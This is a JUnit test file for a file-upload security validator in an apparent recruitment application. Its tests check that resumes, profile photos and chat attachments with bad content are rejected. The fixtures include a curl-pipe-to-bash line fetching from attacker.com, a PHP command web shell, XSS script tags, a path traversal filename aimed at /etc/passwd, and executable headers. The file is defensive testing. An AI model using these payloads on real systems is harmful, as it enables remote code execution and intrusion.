package com.vionsys.hireai.candidate.storage;

import static org.junit.jupiter.api.Assertions.assertDoesNotThrow;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

import java.nio.charset.StandardCharsets;

import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.springframework.mock.web.MockMultipartFile;

import com.vionsys.hireai.candidate.exception.FileStorageException;

class FileSecurityValidatorTest {

    private FileSecurityValidator validator;

    // Valid minimal 1x1 PNG bytes
    private static final byte[] VALID_1X1_PNG = new byte[]{
            (byte) 0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A,
            0x00, 0x00, 0x00, 0x0D, 0x49, 0x48, 0x44, 0x52,
            0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01,
            0x08, 0x06, 0x00, 0x00, 0x00, 0x1F, 0x15, (byte) 0xC4, (byte) 0x89,
            0x00, 0x00, 0x00, 0x0A, 0x49, 0x44, 0x41, 0x54,
            0x78, (byte) 0x9C, 0x63, 0x00, 0x01, 0x00, 0x00, 0x05, 0x00, 0x01,
            0x0D, 0x0A, 0x2D, (byte) 0xB4,
            0x00, 0x00, 0x00, 0x00, 0x49, 0x45, 0x4E, 0x44,
            (byte) 0xAE, 0x42, 0x60, (byte) 0x82
    };

    // Valid minimal PDF bytes
    private static final byte[] VALID_MINIMAL_PDF = (
            "%PDF-1.4\n" +
            "1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n" +
            "2 0 obj<</Type/Pages/Count 1/Kids[3 0 R]>>endobj\n" +
            "3 0 obj<</Type/Page/MediaBox[0 0 3 3]>>endobj\n" +
            "xref\n0 4\n0000000000 65535 f\n0000000009 00000 n\n0000000052 00000 n\n0000000096 00000 n\n" +
            "trailer<</Size 4/Root 1 0 R>>\nstartxref\n147\n%%EOF"
    ).getBytes(StandardCharsets.UTF_8);

    @BeforeEach
    void setUp() {
        validator = new FileSecurityValidator(10 * 1024 * 1024, 5 * 1024 * 1024, 10 * 1024 * 1024);
    }

    @Test
    @DisplayName("Valid PDF resume passes deep security validation")
    void testValidPdfResumePasses() {
        MockMultipartFile file = new MockMultipartFile(
                "file", "candidate_resume.pdf", "application/pdf", VALID_MINIMAL_PDF
        );

        assertDoesNotThrow(() -> validator.validateResumeFile(file));
    }

    @Test
    @DisplayName("PDF file with Windows PE executable header (MZ) is rejected")
    void testExecutableRenamedToPdfRejected() {
        byte[] exeBytes = new byte[]{0x4D, 0x5A, (byte) 0x90, 0x00, 0x03, 0x00, 0x00, 0x00};
        MockMultipartFile file = new MockMultipartFile(
                "file", "malicious_payload.pdf", "application/pdf", exeBytes
        );

        FileStorageException ex = assertThrows(FileStorageException.class,
                () -> validator.validateResumeFile(file));
        assertTrue(ex.getMessage().contains("Executable files") || ex.getMessage().contains("prohibited"));
    }

    @Test
    @DisplayName("PDF file with Linux ELF binary header is rejected")
    void testElfBinaryRenamedToPdfRejected() {
        byte[] elfBytes = new byte[]{0x7F, 0x45, 0x4C, 0x46, 0x02, 0x01, 0x01, 0x00};
        MockMultipartFile file = new MockMultipartFile(
                "file", "binary.pdf", "application/pdf", elfBytes
        );

        FileStorageException ex = assertThrows(FileStorageException.class,
                () -> validator.validateResumeFile(file));
        assertTrue(ex.getMessage().contains("Linux ELF binary") || ex.getMessage().contains("prohibited"));
    }

    @Test
    @DisplayName("PDF file with shell script shebang is rejected")
    void testShellScriptRenamedToPdfRejected() {
        byte[] scriptBytes = "#!/bin/bash\ncurl http://attacker.com/malware.sh | bash\n".getBytes(StandardCharsets.UTF_8);
        MockMultipartFile file = new MockMultipartFile(
                "file", "exploit.pdf", "application/pdf", scriptBytes
        );

        FileStorageException ex = assertThrows(FileStorageException.class,
                () -> validator.validateResumeFile(file));
        assertTrue(ex.getMessage().contains("script") || ex.getMessage().contains("prohibited"));
    }

    @Test
    @DisplayName("File with path traversal in filename is rejected")
    void testPathTraversalFilenameRejected() {
        MockMultipartFile file = new MockMultipartFile(
                "file", "../../etc/passwd.pdf", "application/pdf", VALID_MINIMAL_PDF
        );

        FileStorageException ex = assertThrows(FileStorageException.class,
                () -> validator.validateResumeFile(file));
        assertTrue(ex.getMessage().contains("path traversal"));
    }

    @Test
    @DisplayName("File with dangerous double extension (e.g. resume.php.pdf) is rejected")
    void testDangerousDoubleExtensionRejected() {
        MockMultipartFile file = new MockMultipartFile(
                "file", "resume.php.pdf", "application/pdf", VALID_MINIMAL_PDF
        );

        FileStorageException ex = assertThrows(FileStorageException.class,
                () -> validator.validateResumeFile(file));
        assertTrue(ex.getMessage().contains("Dangerous secondary file extension"));
    }

    @Test
    @DisplayName("Oversized resume file exceeds limit and is rejected")
    void testOversizedResumeFileRejected() {
        byte[] bigContent = new byte[11 * 1024 * 1024]; // 11 MB
        MockMultipartFile file = new MockMultipartFile(
                "file", "huge_resume.pdf", "application/pdf", bigContent
        );

        FileStorageException ex = assertThrows(FileStorageException.class,
                () -> validator.validateResumeFile(file));
        assertTrue(ex.getMessage().contains("exceeds maximum limit"));
    }

    @Test
    @DisplayName("Empty resume file is rejected")
    void testEmptyFileRejected() {
        MockMultipartFile file = new MockMultipartFile(
                "file", "empty.pdf", "application/pdf", new byte[0]
        );

        FileStorageException ex = assertThrows(FileStorageException.class,
                () -> validator.validateResumeFile(file));
        assertTrue(ex.getMessage().contains("cannot be empty"));
    }

    @Test
    @DisplayName("Valid PNG profile photo passes validation and image decode")
    void testValidPngPhotoPasses() {
        MockMultipartFile file = new MockMultipartFile(
                "file", "avatar.png", "image/png", VALID_1X1_PNG
        );

        assertDoesNotThrow(() -> validator.validateProfilePhoto(file));
    }

    @Test
    @DisplayName("Photo with PHP script tag is rejected as embedded script")
    void testPhotoWithPhpScriptRejected() {
        byte[] fakePngWithPhp = "<?php system($_GET['cmd']); ?>".getBytes(StandardCharsets.UTF_8);
        MockMultipartFile file = new MockMultipartFile(
                "file", "webshell.png", "image/png", fakePngWithPhp
        );

        FileStorageException ex = assertThrows(FileStorageException.class,
                () -> validator.validateProfilePhoto(file));
        assertTrue(ex.getMessage().contains("signature") || ex.getMessage().contains("script") || ex.getMessage().contains("magic"));
    }

    @Test
    @DisplayName("Photo with JavaScript <script> tag is rejected (XSS prevention)")
    void testPhotoWithScriptTagRejected() {
        byte[] xssPayload = "<script>alert('xss')</script>".getBytes(StandardCharsets.UTF_8);
        MockMultipartFile file = new MockMultipartFile(
                "file", "xss.png", "image/png", xssPayload
        );

        FileStorageException ex = assertThrows(FileStorageException.class,
                () -> validator.validateProfilePhoto(file));
        assertTrue(ex.getMessage().contains("script") || ex.getMessage().contains("magic") || ex.getMessage().contains("signature"));
    }

    @Test
    @DisplayName("SVG photo upload is strictly rejected (Stored XSS mitigation)")
    void testSvgPhotoUploadRejected() {
        byte[] svg = "<svg xmlns=\"http://www.w3.org/2000/svg\"><script>alert(1)</script></svg>".getBytes(StandardCharsets.UTF_8);
        MockMultipartFile file = new MockMultipartFile(
                "file", "vector.svg", "image/svg+xml", svg
        );

        FileStorageException ex = assertThrows(FileStorageException.class,
                () -> validator.validateProfilePhoto(file));
        assertTrue(ex.getMessage().contains("Unsupported file format"));
    }

    @Test
    @DisplayName("Chat attachment accepts valid PDF document")
    void testChatAttachmentValidPdfPasses() {
        MockMultipartFile file = new MockMultipartFile(
                "file", "job_spec.pdf", "application/pdf", VALID_MINIMAL_PDF
        );

        assertDoesNotThrow(() -> validator.validateChatAttachment(file));
    }

    @Test
    @DisplayName("Chat attachment accepts valid PNG image")
    void testChatAttachmentValidPngPasses() {
        MockMultipartFile file = new MockMultipartFile(
                "file", "screenshot.png", "image/png", VALID_1X1_PNG
        );

        assertDoesNotThrow(() -> validator.validateChatAttachment(file));
    }

    @Test
    @DisplayName("Chat attachment rejects arbitrary executable (.exe)")
    void testChatAttachmentRejectsExecutable() {
        byte[] exeBytes = new byte[]{0x4D, 0x5A, 0x00, 0x00};
        MockMultipartFile file = new MockMultipartFile(
                "file", "installer.exe", "application/x-msdownload", exeBytes
        );

        FileStorageException ex = assertThrows(FileStorageException.class,
                () -> validator.validateChatAttachment(file));
        assertTrue(ex.getMessage().contains("Unsupported attachment format"));
    }
}
